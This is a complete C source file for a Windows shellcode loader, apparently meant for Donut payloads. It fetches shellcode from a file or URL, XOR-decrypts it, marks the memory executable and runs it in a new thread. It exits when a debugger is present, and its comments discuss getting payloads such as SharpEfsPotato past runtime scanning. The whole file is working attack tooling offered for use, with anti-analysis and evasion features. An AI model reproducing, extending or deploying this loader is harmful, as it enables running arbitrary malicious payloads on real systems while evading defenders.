/**
 * Shellcode Loader for Donut Shellcode
 * Loads and executes shellcode from a local file or URL
 * Supports XOR-encrypted shellcode
 * It's worth noting that shellcode will be detected on execution if it doesn't avoid runtime scanning.
 * From testing this was only an issue with C# payloads such as SharpEfsPotato.
 *
 * Usage:
 *   loader.exe /p:FILETOLOAD [/e:XOR_KEY]
 *   loader.exe /p:http://example.com/FILETOLOAD [/e:XOR_KEY]
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>

#pragma comment(lib, "wininet.lib")

// Maximum size for shellcode (20MB)
#define MAX_SHELLCODE_SIZE (20 * 1024 * 1024)
// Maximum URL length
#define MAX_URL_LENGTH 2048
// Maximum file path length
#define MAX_PATH_LENGTH 260
// Maximum XOR key length
#define MAX_XOR_KEY_LENGTH 256

/**
 * Determine if the input is a URL
 *
 * @param input The input string to check
 * @return TRUE if the input is a URL, FALSE otherwise
 */
static BOOL IsUrl(const char* input) {
    // Check if the input starts with "http://" or "https://"
    assert(input != NULL);
    return (strncmp(input, "http://", 7) == 0 || strncmp(input, "https://", 8) == 0);
}

/**
 * Download shellcode from a URL
 *
 * @param url The URL to download from
 * @param shellcode Pointer to buffer where shellcode will be stored
 * @param shellcodeSize Pointer to variable that will store the size of the shellcode
 * @return TRUE if download successful, FALSE otherwise
 */
static BOOL DownloadShellcode(const char* url, PBYTE shellcode, DWORD* shellcodeSize) {
    BOOL result = FALSE;
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;

    assert(url != NULL);
    assert(shellcode != NULL);

    // Initialize WinINet
    hInternet = InternetOpenA("ShellcodeLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[-] Error initializing WinINet: %d\n", GetLastError());
        return FALSE;
    }

    // Open the URL
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("[-] Error opening URL: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Download the shellcode
    while (totalBytesRead < MAX_SHELLCODE_SIZE) {
        if (!InternetReadFile(hConnect, shellcode + totalBytesRead,
            MAX_SHELLCODE_SIZE - totalBytesRead, &bytesRead)) {
            printf("[-] Error reading from URL: %d\n", GetLastError());
            goto cleanup;
        }

        if (bytesRead == 0) {
            // End of file
            result = TRUE;
            break;
        }

        totalBytesRead += bytesRead;
    }

    if (totalBytesRead >= MAX_SHELLCODE_SIZE) {
        printf("[-] Shellcode too large\n");
        goto cleanup;
    }

    *shellcodeSize = totalBytesRead;
    printf("[+] Downloaded %d bytes from %s\n", totalBytesRead, url);

cleanup:
    if (hConnect != NULL) {
        InternetCloseHandle(hConnect);
    }
    if (hInternet != NULL) {
        InternetCloseHandle(hInternet);
    }
    return result;
}

/**
 * Load shellcode from a file
 *
 * @param filePath The path to the file containing shellcode
 * @param shellcode Pointer to buffer where shellcode will be stored
 * @param shellcodeSize Pointer to variable that will store the size of the shellcode
 * @return TRUE if load successful, FALSE otherwise
 */
static BOOL LoadShellcodeFromFile(const char* filePath, PBYTE shellcode, DWORD* shellcodeSize) {
    BOOL result = FALSE;
    FILE* file = NULL;
    size_t bytesRead = 0;
    errno_t err = 0;

    assert(filePath != NULL);
    assert(shellcode != NULL);

    // Open the file with secure function
    err = fopen_s(&file, filePath, "rb");
    if (err != 0 || file == NULL) {
        printf("[-] Error opening file: %s (Error: %d)\n", filePath, err);
        return FALSE;
    }

    // Read the shellcode
    bytesRead = fread(shellcode, 1, MAX_SHELLCODE_SIZE, file);
    if (bytesRead == 0) {
        printf("[-] Error reading file: %s\n", filePath);
        goto cleanup;
    }

    if (bytesRead >= MAX_SHELLCODE_SIZE) {
        printf("[-] Shellcode too large\n");
        goto cleanup;
    }

    *shellcodeSize = (DWORD)bytesRead;
    printf("[+] Loaded %d bytes from %s\n", (int)bytesRead, filePath);
    result = TRUE;

cleanup:
    if (file != NULL) {
        fclose(file);
    }
    return result;
}

/**
 * XOR decrypt the shellcode
 *
 * @param shellcode The shellcode to decrypt
 * @param shellcodeSize Size of the shellcode
 * @param key The XOR key
 * @return TRUE if decryption successful, FALSE otherwise
 */
static BOOL XorDecryptShellcode(PBYTE shellcode, DWORD shellcodeSize, const char* key) {
    DWORD i = 0;
    size_t keyLength = 0;

    assert(shellcode != NULL);
    assert(key != NULL);

    keyLength = strlen(key);
    if (keyLength == 0) {
        printf("[-] Invalid XOR key: empty key\n");
        return FALSE;
    }

    printf("[+] Decrypting shellcode with XOR key...\n");

    // XOR each byte with the corresponding byte from the key
    for (i = 0; i < shellcodeSize; i++) {
        shellcode[i] = shellcode[i] ^ key[i % keyLength];
    }

    return TRUE;
}

/**
 * Execute the shellcode
 *
 * @param shellcode The shellcode to execute
 * @param shellcodeSize Size of the shellcode
 * @return TRUE if execution successful, FALSE otherwise
 */
static BOOL ExecuteShellcode(PBYTE shellcode, DWORD shellcodeSize) {
    BOOL result = FALSE;
    LPVOID execMem = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;

    assert(shellcode != NULL);
    assert(shellcodeSize > 0);

    // Allocate memory for the shellcode
    execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (execMem == NULL) {
        printf("[-] Error allocating memory: %d\n", GetLastError());
        return FALSE;
    }

    // Copy the shellcode to the allocated memory
    memcpy(execMem, shellcode, shellcodeSize);

    // Change the memory protection to allow execution
    if (!VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Error changing memory protection: %d\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Executing shellcode...\n");

    // Create a thread to execute the shellcode
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Error creating thread: %d\n", GetLastError());
        goto cleanup;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
    result = TRUE;

cleanup:
    if (hThread != NULL) {
        CloseHandle(hThread);
    }
    // Note: We don't free execMem to avoid potential crashes if the shellcode returns
    return result;
}

/**
 * Parse the command line arguments
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @param path Buffer to store the extracted path
 * @param pathSize Size of the path buffer
 * @param xorKey Buffer to store the XOR key
 * @param xorKeySize Size of the XOR key buffer
 * @return TRUE if arguments parsed successfully, FALSE otherwise
 */
static BOOL ParseArguments(int argc, char* argv[], char* path, size_t pathSize,
    char* xorKey, size_t xorKeySize) {
    const char* pathPrefix = "/p:";
    const char* xorPrefix = "/e:";
    size_t pathPrefixLen = strlen(pathPrefix);
    size_t xorPrefixLen = strlen(xorPrefix);
    BOOL foundPath = FALSE;
    int i = 0;

    assert(argv != NULL);
    assert(path != NULL);
    assert(xorKey != NULL);
    assert(pathSize > 0);
    assert(xorKeySize > 0);

    // Initialize xorKey to empty string
    xorKey[0] = '\0';

    // Process each argument
    for (i = 1; i < argc; i++) {
        // Check for path argument
        if (strncmp(argv[i], pathPrefix, pathPrefixLen) == 0) {
            errno_t err = strncpy_s(path, pathSize, argv[i] + pathPrefixLen, _TRUNCATE);
            if (err != 0) {
                printf("[-] Error copying path: %d\n", err);
                return FALSE;
            }
            foundPath = TRUE;
        }
        // Check for XOR key argument
        else if (strncmp(argv[i], xorPrefix, xorPrefixLen) == 0) {
            errno_t err = strncpy_s(xorKey, xorKeySize, argv[i] + xorPrefixLen, _TRUNCATE);
            if (err != 0) {
                printf("[-] Error copying XOR key: %d\n", err);
                return FALSE;
            }
        }
    }

    return foundPath; // Must have found the path at minimum
}

/**
 * Main function
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @return 0 if successful, non-zero otherwise
 */
int main(int argc, char* argv[]) {
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    char path[MAX_URL_LENGTH] = { 0 };
    char xorKey[MAX_XOR_KEY_LENGTH] = { 0 };
    BOOL result = FALSE;

    // Don't run if debugger attached
    if (IsDebuggerPresent()) {
        return 1;
    }

    // Allocate shellcode buffer on heap instead of stack to prevent stack overflow
    shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (shellcode == NULL) {
        printf("[-] Failed to allocate memory for shellcode\n");
        return 1;
    }

    // Zero the memory
    memset(shellcode, 0, MAX_SHELLCODE_SIZE);

    // Parse the command line arguments
    if (!ParseArguments(argc, argv, path, sizeof(path), xorKey, sizeof(xorKey))) {
        printf("[-] Invalid arguments\n");
        printf("Usage:\n");
        printf("  %s /p:FILETOLOAD [/e:XOR_KEY]\n", argv[0]);
        printf("  %s /p:http://example.com/FILETOLOAD [/e:XOR_KEY]\n", argv[0]);
        free(shellcode);
        return 1;
    }

    // Load the shellcode
    if (IsUrl(path)) {
        result = DownloadShellcode(path, shellcode, &shellcodeSize);
    }
    else {
        result = LoadShellcodeFromFile(path, shellcode, &shellcodeSize);
    }

    if (!result || shellcodeSize == 0) {
        printf("[-] Failed to load shellcode\n");
        free(shellcode);
        return 1;
    }

    // Decrypt the shellcode if XOR key is provided
    if (xorKey[0] != '\0') {
        if (!XorDecryptShellcode(shellcode, shellcodeSize, xorKey)) {
            printf("[-] Failed to decrypt shellcode\n");
            free(shellcode);
            return 1;
        }
    }

    // Execute the shellcode
    result = ExecuteShellcode(shellcode, shellcodeSize);
    if (!result) {
        printf("[-] Failed to execute shellcode\n");
        free(shellcode);
        return 1;
    }

    // Note: We intentionally don't free shellcode here since ExecuteShellcode might still be using it.
    return 0;
}
